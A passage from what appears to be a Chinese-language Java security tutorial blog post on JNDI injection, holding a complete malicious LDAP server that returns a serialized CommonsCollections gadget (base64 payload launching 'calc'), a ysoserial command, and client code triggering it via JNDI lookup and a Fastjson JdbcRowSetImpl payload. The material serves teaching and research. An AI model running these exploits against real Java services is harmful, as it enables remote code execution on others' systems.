+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> jndi</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.JNDIBypassHighJavaClient.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/12/7 17:44</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJavaClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://localhost:1099/Object&quot;</span>;<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        context.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="利用-ldap-返回序列化数据触发本地-gadget"><a href="#利用-ldap-返回序列化数据触发本地-gadget" class="headerlink" title="利用 ldap 返回序列化数据触发本地 gadget"></a>利用 ldap 返回序列化数据触发本地 gadget</h3><p><font style="color:rgb(80, 80, 92);">LDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的 </font><code>obj.decodeObject()</code><font style="color:rgb(80, 80, 92);"> 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。</font></p>
+<p><font style="color:rgb(80, 80, 92);">使用 ysoserial 工具生成 Commons-Collections 这条 Gadget 并进行 Base64 编码输出：</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-master.jar CommonsCollections6 <span class="hljs-string">&#x27;calc&#x27;</span> | <span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(80, 80, 92);">恶意 LDAP 服务器如下，主要是在 javaSerializedData 字段内填入刚刚生成的反序列化 payload 数据：</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.util.Base64;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.text.ParseException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIGadgetServer</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://vps:8000/#ExportObject&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br><br><span class="hljs-comment">//            Payload1: 利用LDAP+Reference Factory</span><br><span class="hljs-comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());  </span><br><br><span class="hljs-comment">//            Payload2: 返回序列化Gadget</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="hljs-string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));<br>            &#125; <span class="hljs-keyword">catch</span> (ParseException exception) &#123;<br>                exception.printStackTrace();<br>            &#125;<br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIGadgetClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// lookup参数注入触发</span><br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        context.lookup(<span class="hljs-string">&quot;ldap://localhost:1234/ExportObject&quot;</span>);<br><br>        <span class="hljs-comment">// Fastjson反序列化JNDI注入Gadget触发</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>参考连接：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12277?time__1311=GqGxRDcD9D2iqGN4mxU2Qfe4GKK7KtN3x">https://xz.aliyun.com/t/12277?time__1311&#x3D;GqGxRDcD9D2iqGN4mxU2Qfe4GKK7KtN3x</a></li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/jndi/" class="print-no-link">#jndi</a>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
+      
+        <a href="/tags/rmi/" class="print-no-link">#rmi</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java反序列化之jndi注入</div>
+      <div>http://candyb0x.github.io/2024/08/13/jndi注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Candy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月13日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年8月17日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E7%AF%87%E4%B9%8BCC1/" title="Java反序列化CommonsCollections篇之CC1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Java反序列化CommonsCollections篇之CC1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E8%BF%9B%E9%98%B6/" title="Java反序列化之Java反射进阶">
+                        <span class="hidden-mobile">Java反序列化之Java反射进阶</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Candy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
